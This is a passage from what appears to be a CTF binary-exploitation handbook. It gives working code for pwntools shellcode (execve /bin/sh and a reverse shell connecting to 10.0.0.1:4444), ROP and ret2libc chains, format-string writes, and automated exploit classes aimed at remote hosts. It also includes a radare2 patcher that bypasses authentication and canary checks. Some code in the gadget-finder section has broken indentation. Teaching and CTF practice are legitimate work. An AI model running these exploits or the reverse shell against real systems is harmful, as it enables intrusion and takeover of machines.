    arch = elf.get_machine_arch()
    
    # Find .text section
    text_section = elf.get_section_by_name('.text')
    text_data = text_section.data()
    text_addr = text_section['sh_addr']
    
    # Extract symbols
    symtab = elf.get_section_by_name('.symtab')
    if symtab:
        for symbol in symtab.iter_symbols():
            print(f"{symbol.name}: 0x{symbol['st_value']:x}")
    
    # Check for security features
    dynamic = elf.get_section_by_name('.dynamic')
    has_nx = any(seg['p_flags'] & 0x1 == 0 for seg in elf.iter_segments() 
                 if seg['p_type'] == 'PT_GNU_STACK')
```

**PE parsing with pefile**

```bash
pip install pefile
```

```python
import pefile

pe = pefile.PE('binary.exe')

# Extract imports
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"DLL: {entry.dll.decode()}")
    for imp in entry.imports:
        print(f"  {imp.name.decode() if imp.name else 'Ordinal ' + str(imp.ordinal)}")

# Find section containing address
def addr_to_section(pe, addr):
    for section in pe.sections:
        if section.VirtualAddress <= addr < section.VirtualAddress + section.Misc_VirtualSize:
            return section.Name.decode().rstrip('\x00')

# Check ASLR/DEP
dll_characteristics = pe.OPTIONAL_HEADER.DllCharacteristics
aslr = bool(dll_characteristics & 0x0040)
dep = bool(dll_characteristics & 0x0100)
```

**Disassembly with Capstone**

```bash
pip install capstone
```

```python
from capstone import *

# x86-64 disassembly
md = Cs(CS_ARCH_X86, CS_MODE_64)
code = b'\x55\x48\x89\xe5\x48\x83\xec\x10'

for insn in md.disasm(code, 0x1000):
    print(f"0x{insn.address:x}: {insn.mnemonic} {insn.op_str}")

# ARM disassembly
md_arm = Cs(CS_ARCH_ARM, CS_MODE_ARM)

# Enable detail mode for operand analysis
md.detail = True
for insn in md.disasm(code, 0x1000):
    if insn.id == X86_INS_CALL:
        print(f"Call to: {insn.op_str}")
```

**Assembly with Keystone**

```bash
pip install keystone-engine
```

```python
from keystone import *

# Assemble x86-64 shellcode
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm("push rax; pop rbx; xor rax, rax")
shellcode = bytes(encoding)

# Multi-line assembly
code = """
    xor rax, rax
    mov rdi, rsp
    push 0x0068732f
    push 0x6e69622f
    mov rdi, rsp
    mov al, 0x3b
    syscall
"""
shellcode, _ = ks.asm(code)
```

---

## pwntools Library

pwntools is the most comprehensive CTF exploitation framework, providing abstractions for common exploitation tasks.

### Installation and Basic Setup

```bash
pip install pwntools

# Development version with latest features
pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev
```

### Process Interaction

```python
from pwn import *

# Local process
p = process('./binary')

# Remote connection
p = remote('challenge.server.com', 1337)

# SSH connection with process spawn
shell = ssh(host='target.com', user='ctf', password='password')
p = shell.process('/path/to/binary')

# Set context (affects packing, assembly, etc.)
context.arch = 'amd64'  # i386, amd64, arm, aarch64, mips
context.os = 'linux'
context.endian = 'little'
context.log_level = 'debug'  # debug, info, warn, error
```

### I/O Operations

```python
# Receiving data
data = p.recv(1024)              # Receive up to 1024 bytes
data = p.recvline()              # Receive until newline
data = p.recvuntil(b'prompt> ')  # Receive until specific string
data = p.recvall()               # Receive until EOF
data = p.recvrepeat(timeout=2)   # Receive with timeout

# Sending data
p.send(b'data')                  # Send raw bytes
p.sendline(b'data')              # Send with newline
p.sendafter(b'prompt> ', b'input')  # Send after receiving prompt

# Interactive mode
p.interactive()                  # Drop to interactive session (for shell)

# Clean output
data = p.clean()                 # Clear receive buffer
```

### Packing and Unpacking

```python
# Automatic packing based on context.arch
packed = p32(0xdeadbeef)         # 32-bit pack
packed = p64(0xdeadbeef)         # 64-bit pack
value = u32(b'\xef\xbe\xad\xde') # 32-bit unpack
value = u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # 64-bit unpack

# Context-aware packing
context.arch = 'amd64'
packed = pack(0xdeadbeef)        # Uses p64 automatically

# Byte manipulation
data = flat([
    0x41414141,
    0x42424242,
    b'/bin/sh\x00',
    p64(0xdeadbeef)
])
```

### ELF Handling

```python
elf = ELF('./binary')

# Symbol addresses
main_addr = elf.symbols['main']
libc_start = elf.symbols['__libc_start_main']

# PLT and GOT
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# Section information
text_base = elf.get_section_by_name('.text').header.sh_addr

# Finding strings
binsh = next(elf.search(b'/bin/sh\x00'))

# Finding gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Security features
print(f"NX: {elf.nx}")
print(f"PIE: {elf.pie}")
print(f"Canary: {elf.canary}")
print(f"RELRO: {elf.relro}")  # 'Partial', 'Full', or None
```

### ROP Chain Building

```python
elf = ELF('./binary')
rop = ROP(elf)

# Automatic ROP chain construction
rop.call('puts', [elf.got['puts']])
rop.call('main')

payload = fit({
    offset: rop.chain()
})

# Manual gadget selection
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = flat([
    b'A' * offset,
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
])

# Working with libc
libc = ELF('./libc.so.6')
rop_libc = ROP(libc)

# After leak
libc.address = leaked_addr - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
```

### Shellcode Generation

```python
# Context-aware shellcode
context.arch = 'amd64'
context.os = 'linux'

# Generate shell shellcode
shellcode = asm(shellcraft.sh())

# Common shellcodes
shellcode = asm(shellcraft.amd64.linux.sh())           # execve /bin/sh
shellcode = asm(shellcraft.amd64.linux.cat('flag.txt')) # cat file
shellcode = asm(shellcraft.amd64.linux.connect('10.0.0.1', 4444))  # reverse shell

# 32-bit shellcode
context.arch = 'i386'
shellcode = asm(shellcraft.i386.linux.sh())

# Custom assembly
shellcode = asm('''
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    mov al, 0x3b
    syscall
''')
```

### Format String Exploitation

```python
# FmtStr helper
def send_payload(payload):
    p.sendline(payload)
    return p.recvline()

autofmt = FmtStr(send_payload)
offset = autofmt.offset  # Format string offset

# Arbitrary write
payload = fmtstr_payload(offset, {
    elf.got['exit']: elf.symbols['main']
})

# Manual format string crafting
payload = f"%{offset}$p".encode()  # Leak stack value at offset
payload = f"%{offset}$s".encode()  # Leak string at address in stack[offset]

# Writing values
def write_addr(offset, addr, value):
    return f"%{value}c%{offset}$n".encode()  # Write 'value' bytes count
```

### Utilities

```python
# Cyclic pattern generation
pattern = cyclic(200)
offset = cyclic_find(0x61616171)  # Find offset of 'qaaa'

# Logging
log.info("Information message")
log.success("Success message")
log.warning("Warning message")
log.error("Error message")

# Progress indicators
p = log.progress("Leaking addresses")
p.status(f"Leaked: {hex(leak)}")
p.success(f"Base: {hex(base)}")

# Hexdump
print(hexdump(data))

# Disassembly
print(disasm(shellcode))

# XOR operations
result = xor(b'data', b'key')
result = xor(b'data', 0x42)
```

### Complete Exploitation Template

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./binary')
libc = ELF('./libc.so.6')

if args.REMOTE:
    p = remote('challenge.server.com', 1337)
else:
    p = process(elf.path)

# Leak phase
p.sendlineafter(b'prompt> ', payload1)
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked address: {hex(leak)}")

# Calculate base
libc.address = leak - libc.symbols['__libc_start_main']
log.success(f"Libc base: {hex(libc.address)}")

# Build ROP chain
rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh'))])

payload = flat([
    b'A' * offset,
    rop.chain()
])

p.sendline(payload)
p.interactive()
```

---

## Creating Custom GDB Scripts

GDB scripting enables automation of debugging tasks, custom memory analysis, and exploit development workflows.

### GDB Python API Basics

**Script structure**

```python
# script.py
import gdb

class CustomCommand(gdb.Command):
    """Custom GDB command description"""
    
    def __init__(self):
        super(CustomCommand, self).__init__("customcmd", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # Command implementation
        pass

CustomCommand()
```

**Loading scripts**

```bash
# In GDB
source script.py

# Auto-load from .gdbinit
echo "source /path/to/script.py" >> ~/.gdbinit

# One-liner execution
gdb -ex "source script.py" -ex "run" ./binary
```

### Memory Operations

```python
import gdb

# Read memory
def read_memory(address, size):
    inferior = gdb.selected_inferior()
    return inferior.read_memory(address, size).tobytes()

# Write memory
def write_memory(address, data):
    inferior = gdb.selected_inferior()
    inferior.write_memory(address, data)

# Read register
def read_register(reg_name):
    frame = gdb.selected_frame()
    return int(frame.read_register(reg_name))

# Parse address from string
def parse_address(addr_str):
    return int(gdb.parse_and_eval(addr_str))

# Example usage
rsp = read_register('rsp')
stack_data = read_memory(rsp, 0x100)
```

### Breakpoint Automation

```python
class CustomBreakpoint(gdb.Breakpoint):
    def __init__(self, location):
        super(CustomBreakpoint, self).__init__(location)
        self.silent = True  # Don't print stop message
    
    def stop(self):
        # This runs when breakpoint hits
        rdi = read_register('rdi')
        rsi = read_register('rsi')
        
        gdb.write(f"Arguments: rdi={hex(rdi)}, rsi={hex(rsi)}\n")
        
        # Return False to continue execution
        # Return True to stop
        return False

# Set breakpoint
bp = CustomBreakpoint("*main+42")
bp = CustomBreakpoint("malloc")  # Symbol names work too
```

### Advanced Breakpoint with Conditions

```python
class ConditionalBreakpoint(gdb.Breakpoint):
    def __init__(self, location, condition_func):
        super().__init__(location)
        self.silent = True
        self.condition_func = condition_func
        self.hit_count = 0
    
    def stop(self):
        self.hit_count += 1
        
        if self.condition_func():
            gdb.write(f"Condition met at hit {self.hit_count}\n")
            return True
        
        return False

# Example: Break when rdi contains specific value
def check_rdi():
    rdi = read_register('rdi')
    return rdi == 0xdeadbeef

bp = ConditionalBreakpoint("*0x401234", check_rdi)
```

### Custom Search Commands

```python
class SearchMemory(gdb.Command):
    """Search memory for pattern: searchmem PATTERN [START] [END]"""
    
    def __init__(self):
        super().__init__("searchmem", gdb.COMMAND_DATA)
    
    def invoke(self, arg, from_tty):
        args = gdb.string_to_argv(arg)
        
        if len(args) < 1:
            gdb.write("Usage: searchmem PATTERN [START] [END]\n")
            return
        
        pattern = args[0].encode()
        
        # Get memory mappings
        mappings = gdb.execute("info proc mappings", to_string=True)
        
        for line in mappings.split('\n'):
            if 'rwx' in line or 'rw-' in line:
                parts = line.split()
                if len(parts) >= 2:
                    start = int(parts[0], 16)
                    end = int(parts[1], 16)
                    
                    try:
                        data = read_memory(start, end - start)
                        offset = data.find(pattern)
                        
                        if offset != -1:
                            addr = start + offset
                            gdb.write(f"Found at: 0x{addr:x}\n")
                    except:
                        pass

SearchMemory()
```

### Stack Analysis

```python
class AnalyzeStack(gdb.Command):
    """Analyze stack frame: analyzestack [DEPTH]"""
    
    def __init__(self):
        super().__init__("analyzestack", gdb.COMMAND_STACK)
    
    def invoke(self, arg, from_tty):
        depth = int(arg) if arg else 20
        
        rsp = read_register('rsp')
        rbp = read_register('rbp')
        
        gdb.write(f"RSP: 0x{rsp:x}\n")
        gdb.write(f"RBP: 0x{rbp:x}\n")
        gdb.write(f"Frame size: {rbp - rsp}\n\n")
        
        for i in range(depth):
            addr = rsp + i * 8
            try:
                value = int.from_bytes(read_memory(addr, 8), 'little')
                
                # Try to resolve symbol
                try:
                    sym = gdb.execute(f"info symbol 0x{value:x}", to_string=True).strip()
                except:
                    sym = ""
                
                marker = " <- RSP" if addr == rsp else " <- RBP" if addr == rbp else ""
                gdb.write(f"0x{addr:x}: 0x{value:016x} {sym}{marker}\n")
            except:
                break

AnalyzeStack()
```

### Heap Exploitation Helper

```python
class HeapInfo(gdb.Command):
    """Display heap chunk information: heapinfo ADDRESS"""
    
    def __init__(self):
        super().__init__("heapinfo", gdb.COMMAND_DATA)
    
    def invoke(self, arg, from_tty):
        if not arg:
            gdb.write("Usage: heapinfo ADDRESS\n")
            return
        
        addr = parse_address(arg)
        
        # Read chunk header (glibc malloc)
        prev_size = int.from_bytes(read_memory(addr - 16, 8), 'little')
        size = int.from_bytes(read_memory(addr - 8, 8), 'little')
        
        # Parse flags from size field
        size_actual = size & ~0x7
        prev_inuse = size & 0x1
        is_mmapped = size & 0x2
        non_main_arena = size & 0x4
        
        gdb.write(f"Chunk at 0x{addr:x}\n")
        gdb.write(f"  prev_size: 0x{prev_size:x}\n")
        gdb.write(f"  size: 0x{size_actual:x}\n")
        gdb.write(f"  PREV_INUSE: {bool(prev_inuse)}\n")
        gdb.write(f"  IS_MMAPPED: {bool(is_mmapped)}\n")
        gdb.write(f"  NON_MAIN_ARENA: {bool(non_main_arena)}\n")
        
        # Read fd/bk for freed chunks
        if not prev_inuse:
            fd = int.from_bytes(read_memory(addr, 8), 'little')
            bk = int.from_bytes(read_memory(addr + 8, 8), 'little')
            gdb.write(f"  fd: 0x{fd:x}\n")
            gdb.write(f"  bk: 0x{bk:x}\n")

HeapInfo()
```

### Automated Exploitation Workflow

```python
class AutoPwn(gdb.Command):
    """Automated exploitation: autopwn"""
    
    def __init__(self):
        super().__init__("autopwn", gdb.COMMAND_USER)
        self.leaked_addresses = {}
    
    def invoke(self, arg, from_tty):
        # Set breakpoint at vulnerable function
        bp = CustomBreakpoint("strcpy")
        
        gdb.execute("run < input.txt")
        
        # Leak addresses
        self.leak_libc()
        
        # Calculate offsets
        self.calculate_gadgets()
        
        # Generate payload
        self.generate_payload()
    
    def leak_libc(self):
        # Read GOT entry
        got_entry = parse_address("&_GLOBAL_OFFSET_TABLE_")
        libc_addr = int.from_bytes(read_memory(got_entry, 8), 'little')
        
        self.leaked_addresses['libc_base'] = libc_addr & ~0xfff
        gdb.write(f"Leaked libc base: 0x{self.leaked_addresses['libc_base']:x}\n")
    
    def calculate_gadgets(self):
        # Use ropper or manual search
        gdb.execute("shell ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search 'pop rdi'")
    
    def generate_payload(self):
        with open('exploit_payload.bin', 'wb') as f:
            # Write payload based on leaked addresses
            pass

AutoPwn()
```

### GDB Command File for CTF Setup

```bash
# ctf.gdb
set disassembly-flavor intel
set pagination off
set follow-fork-mode child

define hook-stop
    info registers
    x/10i $pc
end

define search_gadget
    shell ropper --file $arg0 --search "$arg1"
end

define leak_stack
    set $i = 0
    while $i < 50
        x/gx $rsp+$i*8
        set $i = $i + 1
    end
end

source ~/tools/pwndbg/gdbinit.py
```

---

## Radare2 Scripting (r2pipe)

r2pipe enables programmatic control of radare2 from Python, JavaScript, or other languages.

### Installation and Setup

```bash
pip install r2pipe

# Alternative: Development version
pip install git+https://github.com/radareorg/radare2-r2pipe
```

### Basic r2pipe Usage

```python
import r2pipe

# Open binary
r2 = r2pipe.open('./binary')

# Analyze binary
r2.cmd('aaa')  # Analyze all

# Get information
info = r2.cmdj('ij')  # JSON output for file info
print(f"Architecture: {info['bin']['arch']}")
print(f"Bits: {info['bin']['bits']}")

# List functions
functions = r2.cmdj('aflj')
for func in functions:
    print(f"{func['name']}: 0x{func['offset']:x}")

# Disassemble function
disasm = r2.cmd('pdf @ main')
print(disasm)

# Close when done
r2.quit()
```

### Advanced Analysis

```python
import r2pipe

r2 = r2pipe.open('./binary')
r2.cmd('aaa')

# Get function information
def get_function_info(func_name):
    r2.cmd(f's {func_name}')  # Seek to function
    info = r2.cmdj('afij')    # Function info JSON
    
    if info:
        func = info[0]
        return {
            'address': func['offset'],
            'size': func['size'],
            'calls': func.get('callrefs', []),
            'xrefs': func.get('codexrefs', [])
        }
    return None

# Find all calls to specific function
def find_calls_to(target):
    r2.cmd(f's {target}')
    xrefs = r2.cmdj('axtj')  # Cross-references to
    
    callers = []
    for xref in xrefs:
        if xref['type'] == 'CALL':
            callers.append({
                'from': xref['from'],
                'opcode': xref.get('opcode', '')
            })
    return callers

# Get strings with references
def get_strings_with_xrefs():
    strings = r2.cmdj('izzj')  # All strings JSON
    
    for s in strings:
        r2.cmd(f's {s["vaddr"]}')
        xrefs = r2.cmdj('axtj')
        
        if xrefs:
            print(f"String: {s['string']}")
            for xref in xrefs:
                print(f"  Referenced from: 0x{xref['from']:x}")
```

### Automated Vulnerability Scanning

```python
import r2pipe
import re

class BinaryScanner:
    def __init__(self, binary_path):
        self.r2 = r2pipe.open(binary_path)
        self.r2.cmd('aaa')
        self.vulnerabilities = []
    
    def check_dangerous_functions(self):
        """Find calls to dangerous functions"""
        dangerous = ['strcpy', 'gets', 'sprintf', 'scanf', 'system']
        
        for func in dangerous:
            # Find function address
            addr_output = self.r2.cmd(f'?v sym.imp.{func}')
            if addr_output and '0x' in addr_output:
                addr = int(addr_output.strip(), 16)
                
                # Find cross-references
                self.r2.cmd(f's {addr}')
                xrefs = self.r2.cmdj('axtj')
                
                if xrefs:
                    self.vulnerabilities.append({
                        'type': 'dangerous_function',
                        'function': func,
                        'calls': [x['from'] for x in xrefs]
                    })
    
    def check_format_strings(self):
        """Find potential format string vulnerabilities"""
        functions = self.r2.cmdj('aflj')
        
        for func in functions:
            self.r2.cmd(f's {func["offset"]}')
            disasm = self.r2.cmd('pdf')
            
            # Look for printf-family calls with user-controlled format
            if 'printf' in disasm or 'fprintf' in disasm:
                lines = disasm.split('\n')
                for i, line in enumerate(lines):
                    if 'call' in line and any(f in line for f in ['printf', 'fprintf']):
                        # Check previous instructions for format string setup
                        if i > 0 and 'rdi' in lines[i-1]:  # First argument
                            self.vulnerabilities.append({
                                'type': 'potential_format_string',
                                'location': func['offset'],
                                'function': func['name']
                            })
    
    def check_buffer_overflows(self):
        """Analyze for potential buffer overflows"""
        functions = self.r2.cmdj('aflj')
        
        for func in functions:
            self.r2.cmd(f's {func["offset"]}')
            
            # Get function analysis
            analysis = self.r2.cmdj('afij')
            if analysis:
                # Check for stack frame size
                frame_size = analysis[0].get('stackframe', 0)
                
                # Look for reads exceeding frame size
                disasm = self.r2.cmd('pdf')
                if 'read' in disasm or 'fgets' in disasm:
                    self.vulnerabilities.append({
                        'type': 'potential_buffer_overflow',
                        'function': func['name'],
                        'frame_size': frame_size
                    })
    
    def report(self):
        print(f"\n[*] Found {len(self.vulnerabilities)} potential vulnerabilities:\n")
        for vuln in self.vulnerabilities:
            print(f"Type: {vuln['type']}")
            for key, value in vuln.items():
                if key != 'type':
                    print(f"  {key}: {value}")
            print()

# Usage
scanner = BinaryScanner('./binary')
scanner.check_dangerous_functions()
scanner.check_format_strings()
scanner.check_buffer_overflows()
scanner.report()
```

### ROP Gadget Finder

```python
import r2pipe
import struct

class RopGadgetFinder:
    def __init__(self, binary_path):
        self.r2 = r2pipe.open(binary_path)
        self.r2.cmd('aaa')
        self.gadgets = {}
    
    def find_gadgets(self, max_length=5):
        """Find ROP gadgets using /R command"""
        self.r2.cmd('/R')  # Search for ROP gadgets
        
        # Get gadgets in JSON format
        gadgets_output = self.r2.cmd('/Rj')
        
        try:
            import json
            gadgets = json.loads(gadgets_output)
            
            for gadget in gadgets:
                opcodes = gadget.get('opcodes', '')
                addr = gadget.get('offset', 0)
                
                if opcodes:
                    if opcodes not in self.gadgets:
                        self.gadgets[opcodes] = []
                    self.gadgets[opcodes].append(addr)
        except:
            # Fallback to text parsing
            gadgets_text = self.r2.cmd('/R')
            for line in gadgets_text.split('\n'):
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        addr = int(parts[0], 16)
                        opcodes = ' '.join(parts[1:])
                        
                        if opcodes not in self.gadgets:
                            self.gadgets[opcodes] = []
                        self.gadgets[opcodes].append(addr)
    
    def find_specific(self, pattern):
        """Find gadgets matching specific pattern"""
        matching = {}
        for opcodes, addrs in self.gadgets.items(): if pattern.lower() in opcodes.lower(): matching[opcodes] = addrs return matching

def find_pop_gadgets(self):
    """Find all pop register gadgets"""
    return self.find_specific('pop')

def find_syscall(self):
    """Find syscall/int 0x80 gadgets"""
    syscalls = {}
    syscalls.update(self.find_specific('syscall'))
    syscalls.update(self.find_specific('int 0x80'))
    return syscalls

def build_chain(self, gadget_list):
    """Build ROP chain from gadget list"""
    chain = b''
    for item in gadget_list:
        if isinstance(item, int):
            chain += struct.pack('<Q', item)
        elif isinstance(item, bytes):
            chain += item
    return chain

def export_gadgets(self, filename='gadgets.txt'):
    """Export gadgets to file"""
    with open(filename, 'w') as f:
        for opcodes, addrs in sorted(self.gadgets.items()):
            for addr in addrs:
                f.write(f"0x{addr:016x}: {opcodes}\n")

# Usage

rop = RopGadgetFinder('./binary') rop.find_gadgets()

# Find specific gadgets

pop_rdi = rop.find_specific('pop rdi; ret') if pop_rdi: print(f"pop rdi; ret gadgets: {[hex(a) for a in pop_rdi[list(pop_rdi.keys())[0]]]}")

syscalls = rop.find_syscall() print(f"Found {len(syscalls)} syscall gadgets")

rop.export_gadgets()
````

### Symbolic Execution Integration

```python
import r2pipe

class SymbolicAnalyzer:
    def __init__(self, binary_path):
        self.r2 = r2pipe.open(binary_path)
        self.r2.cmd('aaa')
    
    def analyze_function_paths(self, func_name):
        """Analyze execution paths in function"""
        self.r2.cmd(f's {func_name}')
        
        # Get basic blocks
        blocks = self.r2.cmdj('afbj')
        
        paths = []
        for block in blocks:
            path_info = {
                'addr': block['addr'],
                'size': block['size'],
                'jump': block.get('jump', None),
                'fail': block.get('fail', None),
                'instructions': []
            }
            
            # Disassemble block
            self.r2.cmd(f's {block["addr"]}')
            instructions = self.r2.cmdj(f'pDj {block["size"]}')
            
            for insn in instructions:
                path_info['instructions'].append({
                    'offset': insn['offset'],
                    'opcode': insn['opcode'],
                    'type': insn.get('type', 'unknown')
                })
            
            paths.append(path_info)
        
        return paths
    
    def find_constraints(self, func_name):
        """Find conditional constraints in function"""
        self.r2.cmd(f's {func_name}')
        disasm = self.r2.cmd('pdf')
        
        constraints = []
        for line in disasm.split('\n'):
            # Look for comparison instructions
            if any(op in line for op in ['cmp', 'test', 'je', 'jne', 'jg', 'jl']):
                parts = line.split()
                if len(parts) >= 2:
                    constraints.append({
                        'address': parts[0],
                        'instruction': ' '.join(parts[1:])
                    })
        
        return constraints

# Usage
analyzer = SymbolicAnalyzer('./binary')
paths = analyzer.analyze_function_paths('main')
print(f"Found {len(paths)} basic blocks in main")

constraints = analyzer.find_constraints('main')
for c in constraints:
    print(f"{c['address']}: {c['instruction']}")
````

### Binary Patching

```python
import r2pipe

class BinaryPatcher:
    def __init__(self, binary_path):
        self.r2 = r2pipe.open(binary_path, flags=['-w'])  # Open in write mode
        self.r2.cmd('aaa')
        self.patches = []
    
    def patch_instruction(self, address, assembly):
        """Patch instruction at address with new assembly"""
        # Seek to address
        self.r2.cmd(f's {address}')
        
        # Assemble new instruction
        assembled = self.r2.cmd(f'pa {assembly}')
        
        # Write to binary
        self.r2.cmd(f'wx {assembled}')
        
        self.patches.append({
            'address': address,
            'assembly': assembly,
            'bytes': assembled
        })
    
    def patch_bytes(self, address, hex_bytes):
        """Patch raw bytes at address"""
        self.r2.cmd(f's {address}')
        self.r2.cmd(f'wx {hex_bytes}')
        
        self.patches.append({
            'address': address,
            'bytes': hex_bytes
        })
    
    def nop_instruction(self, address, count=1):
        """NOP out instructions at address"""
        self.r2.cmd(f's {address}')
        
        # Get architecture info
        info = self.r2.cmdj('ij')
        arch = info['bin']['arch']
        
        # Architecture-specific NOP
        if arch == 'x86':
            nop_byte = '90'
        elif arch == 'arm':
            nop_byte = '00 00 a0 e1'  # ARM NOP: mov r0, r0
        else:
            nop_byte = '00'
        
        nop_bytes = nop_byte * count
        self.r2.cmd(f'wx {nop_bytes}')
        
        self.patches.append({
            'address': address,
            'type': 'nop',
            'count': count
        })
    
    def bypass_check(self, address):
        """Bypass conditional jump (convert to unconditional)"""
        self.r2.cmd(f's {address}')
        
        # Get current instruction
        insn = self.r2.cmdj('pdj 1')[0]
        
        if 'j' in insn['opcode']:
            # Patch conditional jump to jmp
            self.patch_instruction(address, 'jmp ' + insn['opcode'].split()[-1])
    
    def save_patched(self, output_path):
        """Save patched binary to new file"""
        self.r2.cmd(f'wtf {output_path}')
        print(f"[*] Patched binary saved to {output_path}")
        print(f"[*] Applied {len(self.patches)} patches")
    
    def undo_patches(self):
        """Reload original binary (undo all patches)"""
        self.r2.cmd('oo')
        self.patches = []

# Usage
patcher = BinaryPatcher('./binary')

# Patch authentication check
patcher.bypass_check('0x401234')

# NOP out canary check
patcher.nop_instruction('0x401567', count=5)

# Patch call to exit with call to main
patcher.patch_instruction('0x401890', 'call main')

# Save patched binary
patcher.save_patched('./binary_patched')
```

### Automated Script Generator

```python
import r2pipe

class R2ScriptGenerator:
    def __init__(self, binary_path):
        self.r2 = r2pipe.open(binary_path)
        self.r2.cmd('aaa')
    
    def generate_exploit_template(self):
        """Generate exploitation template based on binary analysis"""
        info = self.r2.cmdj('ij')
        arch = info['bin']['arch']
        bits = info['bin']['bits']
        
        template = f"""#!/usr/bin/env python3
# Auto-generated exploitation template
# Target: {info['core']['file']}
# Architecture: {arch} {bits}-bit

from pwn import *

context.arch = '{arch}'
context.bits = {bits}
context.log_level = 'info'

elf = ELF('{info['core']['file']}')
"""
        
        # Check for security features
        checksec = self.r2.cmd('iI')
        if 'canary' in checksec:
            template += "\n# WARNING: Stack canary detected\n"
        if 'nx' in checksec:
            template += "# WARNING: NX enabled\n"
        if 'pie' in checksec:
            template += "# WARNING: PIE enabled\n"
        
        # Find dangerous functions
        functions = self.r2.cmdj('aflj')
        dangerous = ['gets', 'strcpy', 'sprintf', 'scanf']
        
        for func in functions:
            if any(d in func['name'] for d in dangerous):
                template += f"\n# Vulnerable function found: {func['name']} at 0x{func['offset']:x}"
        
        template += """

# Start process
if args.REMOTE:
    p = remote('target.com', 1337)
else:
    p = process(elf.path)

# Exploitation code here

p.interactive()
"""
        
        return template
    
    def generate_rop_script(self):
        """Generate ROP chain building script"""
        # Find useful gadgets
        self.r2.cmd('/R')
        
        script = """#!/usr/bin/env python3
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Gadgets found by r2:
"""
        
        gadgets_output = self.r2.cmd('/R')
        for line in gadgets_output.split('\n')[:10]:  # First 10 gadgets
            if line.strip():
                script += f"# {line}\n"
        
        script += """
# Build ROP chain
# TODO: Customize based on target

payload = flat([
    b'A' * offset,
    # ROP chain here
])

p = process('./binary')
p.sendline(payload)
p.interactive()
"""
        
        return script

# Usage
generator = R2ScriptGenerator('./binary')

# Generate exploit template
exploit = generator.generate_exploit_template()
with open('exploit.py', 'w') as f:
    f.write(exploit)

print("[*] Generated exploit.py")
```

---

## Automating Exploit Generation

Automated exploit generation combines binary analysis, vulnerability detection, and payload crafting.

### Pwntools-based Automation

```python
#!/usr/bin/env python3
from pwn import *
import string

class AutoExploit:
    def __init__(self, binary_path, remote_target=None):
        self.elf = ELF(binary_path)
        self.remote_target = remote_target
        self.offset = None
        self.leaked_addresses = {}
        
        context.arch = self.elf.arch
        context.os = 'linux'
        context.log_level = 'info'
    
    def start_process(self):
        """Start local or remote process"""
        if self.remote_target:
            host, port = self.remote_target
            return remote(host, port)
        else:
            return process(self.elf.path)
    
    def find_offset(self):
        """Automatically find buffer overflow offset"""
        log.info("Finding buffer overflow offset...")
        
        # Generate cyclic pattern
        pattern = cyclic(500)
        
        p = self.start_process()
        p.sendline(pattern)
        p.wait()
        
        # Get crash information
        core = p.corefile
        fault_addr = core.fault_addr
        
        # Find offset
        self.offset = cyclic_find(fault_addr)
        log.success(f"Found offset: {self.offset}")
        
        core.close()
        return self.offset
    
    def leak_libc(self):
        """Leak libc address using puts"""
        log.info("Leaking libc address...")
        
        if not self.offset:
            self.find_offset()
        
        # Find gadgets
        rop = ROP(self.elf)
        
        # Build leak payload
        payload = flat([
            b'A' * self.offset,
            rop.find_gadget(['pop rdi', 'ret'])[0],
            self.elf.got['puts'],
            self.elf.plt['puts'],
            self.elf.symbols['main']
        ])
        
        p = self.start_process()
        p.sendline(payload)
        
        # Receive leak
        p.recvuntil(b'expected output')  # Adjust based on target
        leak = u64(p.recv(6).ljust(8, b'\x00'))
        
        log.success(f"Leaked puts@libc: {hex(leak)}")
        
        # Calculate libc base
        libc = ELF('./libc.so.6')  # Adjust path
        libc.address = leak - libc.symbols['puts']
        
        self.leaked_addresses['libc_base'] = libc.address
        log.success(f"Libc base: {hex(libc.address)}")
        
        p.close()
        return libc
    
    def build_rop_chain(self, libc):
        """Build final ROP chain for shell"""
        log.info("Building ROP chain...")
        
        rop = ROP(libc)
        
        binsh = next(libc.search(b'/bin/sh\x00'))
        
        # ret2libc payload
        payload = flat([
            b'A' * self.offset,
            rop.find_gadget(['ret'])[0],  # Stack alignment
            rop.find_gadget(['pop rdi', 'ret'])[0],
            binsh,
            libc.symbols['system']
        ])
        
        return payload
    
    def exploit(self):
        """Full exploitation chain"""
        log.info("Starting exploitation...")
        
        # Step 1: Leak libc
        libc = self.leak_libc()
        
        # Step 2: Build exploit
        payload = self.build_rop_chain(libc)
        
        # Step 3: Execute
        p = self.start_process()
        p.sendline(payload)
        
        log.success("Exploit sent, dropping to shell...")
        p.interactive()

# Usage
if __name__ == '__main__':
    exploit = AutoExploit('./vulnerable_binary')
    
    # Or for remote: exploit = AutoExploit('./binary', ('target.com', 1337))
    
    exploit.exploit()
```

### Format String Automation

```python
#!/usr/bin/env python3
from pwn import *

class FormatStringExploit:
    def __init__(self, binary_path):
        self.elf = ELF(binary_path)
        self.offset = None
        
        context.arch = self.elf.arch
    
    def start(self):
        return process(self.elf.path)
    
    def find_offset(self):
        """Find format string offset"""
        log.info("Finding format string offset...")
        
        for i in range(1, 20):
            p = self.start()
            
            payload = f"AAAA.%{i}$p".encode()
            p.sendline(payload)
            
            output = p.recvall(timeout=1)
            p.close()
            
            if b'0x41414141' in output or b'AAAA' in output:
                self.offset = i
                log.success(f"Found offset: {i}")
                return i
        
        log.error("Could not find format string offset")
        return None
    
    def leak_address(self, position):
        """Leak value at stack position"""
        p = self.start()
        
        payload = f"%{position}$p".encode()
